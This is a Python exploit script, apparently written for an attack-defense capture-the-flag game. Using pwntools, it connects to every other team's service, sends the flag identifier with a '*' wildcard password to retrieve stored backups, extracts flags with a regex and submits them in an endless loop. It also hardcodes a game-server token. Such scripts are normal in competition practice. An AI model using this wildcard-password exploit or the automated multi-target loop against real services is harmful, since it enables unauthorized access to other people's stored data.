import pwn
import swpag_client
import re
import random

def run(target):
  hostname = target['hostname']
  port = int(target['port'])
  flag_id = target['flag_id']
  timeout_dur = 2

  r = pwn.remote(hostname, port)

  #include timeouts to prevent hangs
  r.recvuntil("Exit:\n", timeout=timeout_dur)
  r.wait(0.5)
  r.send("2\n")
  r.wait(0.5)
  r.recvuntil("name for your backup:\n", timeout=timeout_dur)
  r.wait(0.5)
  r.send(flag_id + "\n")
  r.wait(0.5)
  r.recvuntil("password for your backup:\n", timeout=timeout_dur)
  r.wait(0.5)
  r.send("*\n")
  r.wait(0.5)
  r.recvuntil("stored securely:\n", timeout=timeout_dur)
  r.wait(0.5)
  file = r.recvline(timeout=timeout_dur).decode('ascii')
  r.wait(1)
  flags = re.findall(r'FLG[A-Za-z0-9]{13}', file)
  print(flags)

  r.close()

  return flags

team = swpag_client.Team('http://52.37.204.0/', 'nt4yw7LjoPFc2WE49cLG')

while True:
  targets = team.get_targets(1)
  random.shuffle(targets)

  for target in targets:
    if target['hostname'] == 'team12': # own flag
      continue
    try:
      flags = run(target)
    except:
      continue
    batches = (len(flags) // 100) + 1
    for i in range(batches):
      batch = flags[i*100:(i+1)*100]
      if len(batch) > 0:
        results = team.submit_flag(batch)
        count = 0
        for result in results:
          if result == u'correct':
            count += 1
        print(str(count) + " correct!\n")

